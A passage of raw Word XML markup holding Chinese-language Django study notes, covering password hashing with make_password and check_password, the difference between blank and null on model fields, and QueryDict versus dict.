        <w:t>    'django.contrib.auth.hashers.BCryptPasswordHasher',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9FD434" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    'django.contrib.auth.hashers.SHA1PasswordHasher',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779CD59C" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    'django.contrib.auth.hashers.MD5PasswordHasher',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BBB24A" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    'django.contrib.auth.hashers.CryptPasswordHasher',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B39B05" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4EFC5C" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>具体的密码生成以及验证实现</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433444D7" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.hashers import make_password,check_password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4741C9D7" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pwd='4562154'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E91FDC" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>mpwd=make_password(pwd,None,'pbkdf2_sha256') # 创建django密码，第三个参数为加密算法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03970676" w14:textId="6ED7FE6B" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pwd_bool=check_password(pwd,mpwd) # 返回的是一个bool类型的值，验证密码正确与否</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53DF852D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django之密码加密</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789A3841" w14:textId="1B024944" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通过django自带的类库，来加密解密很方便，下面来简单介绍下；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284F34A3" w14:textId="151D2EEE" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>导入包：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A3254A" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.hashers import make_password, check_password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FFED749" w14:textId="6BFC785A" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>从名字就可以看出来他们的作用了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F6FBCC" w14:textId="1BD590B8" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个是生成密码，一个是核对密码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64AE0FF2" w14:textId="32AF2172" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A6934E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>make_password("123456")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD3C1B1" w14:textId="24A8B4BD" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>得到结果：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59BA7E43" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>u'pbkdf2_sha25615000MAjic3nDGFoi$qbclz+peplspCbRF6uoPZZ42aJIIkMpGt6lQ+Iq8nfQ='</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA0967F" w14:textId="2695B114" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>另外也可以通过参数来生成密码：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBA8058" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; make_password("123456", None, 'pbkdf2_sha256')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53610ACD" w14:textId="322B6CD5" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>校验:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0211FF6A" w14:textId="7C59B661" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>校验就是通过check_password(原始值, 生成的密文)来校验密码的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07802668" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; check_password("123456","pbkdf2_sha25615000MAjic3nDGFoi$qbclz+peplspCbRF6uoPZZ42aJIIkMpGt6lQ+Iq8nfQ=")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E411E5" w14:textId="30543E06" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36408C81" w14:textId="200D1DDC" w:rsidR="00717181" w:rsidRDefault="00557AFE" w:rsidP="00717181">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059</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>解释</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>blank</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655AF2B9" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>blank</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497E7B31" w14:textId="12545DD7" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>设置为True时，字段可以为空。设置为False时，字段是必须填写的。字符型字段CharField和TextField是用空字符串来存储空值的。如果为True，字段允许为空，默认不允许。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1448D04F" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486C2171" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>设置为True时，django用Null来存储空值。日期型、时间型和数字型字段不接受空字符串。所以设置IntegerField，DateTimeField型字段可以为空时，需要将blank，null均设为True。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774BD579" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果为True，空值将会被存储为NULL，默认为False。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3349729A" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果想设置BooleanField为空时可以选用NullBooleanField型字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BE4A4D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一句话概括</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563522F8" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>null 是针对数据库而言，如果 null=True, 表示数据库的该字段可以为空。NULL represents non-existent data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327C9607" w14:textId="7E41C0D5" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>blank 是针对表单的，如果 blank=True，表示你的表单填写该字段的时候可以不填。比如 admin 界面下增加 model 一条记录的时候。直观的看到就是该字段不是粗体</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C1CAEE" w14:textId="4A60E8CF" w:rsidR="00717181" w:rsidRDefault="00557AFE" w:rsidP="00717181">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060</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>QueryDict</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D92CF3A" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    在HttpRequest对象中, GET和POST属性是django.http.QueryDict类的实例。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5424917A" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    QueryDict类似字典的自定义类，用来处理单键对应多值的情况。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EDD202" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在 HttpRequest 对象中,属性 GET 和 POST 得到的都是 django.http.QueryDict 所创建的实例。这是一个</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539E64A7" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> django 自定义的类似字典的类，用来处理同一个键带多个值的情况。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8830E8" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　在 python 原始的字典中，当一个键出现多个值的时候会发生冲突，只保留最后一个值。而在 HTML 表单中，通常会发生一个键有多个值的情况，例如 &lt;select multiple&gt; （多选框）就是一个很常见情况。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C9371B" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　request.POST 和request.GET 的QueryDict 在一个正常的请求/响应循环中是不可变的。若要获得可变的版本，需要使用.copy()方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B88825" w14:textId="1B2C9492" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4BECE6" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django QuerySet对象转换成字典对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DCC1E54" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
